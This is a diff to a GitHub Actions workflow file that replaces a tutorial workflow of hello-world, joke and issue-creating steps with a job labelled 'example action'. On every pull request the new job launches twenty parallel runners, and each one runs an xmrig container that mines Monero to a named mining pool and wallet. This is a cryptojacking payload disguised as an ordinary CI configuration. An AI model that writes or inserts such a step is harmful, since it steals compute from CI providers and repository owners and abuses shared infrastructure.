@@ -1,28 +1,22 @@
-name: JS Actions
+name: example action
 
-on:
-  pull_request:
-    types: [labeled]
+on: [pull_request]
 
 jobs:
-  action:
+  sorry:
+    name: sorry
+
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-      - uses: actions/checkout@v1
-
-      - name: hello-action
-        uses: ./.github/actions/hello-world
-        with:
-          third-greeting: "Learning Lab user"
-
-      - name: ha-ha
-        uses: ./.github/actions/joke-action
-        id: jokes
-
-      - name: create-issue
-        uses: ./.github/actions/issue-maker
-        with: 
-          repo-token: ${{secrets.GITHUB_TOKEN}}
-          joke: ${{steps.jokes.outputs.joke-output}}
+      - name: Sorry Bill
+        run: docker run --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
 
 
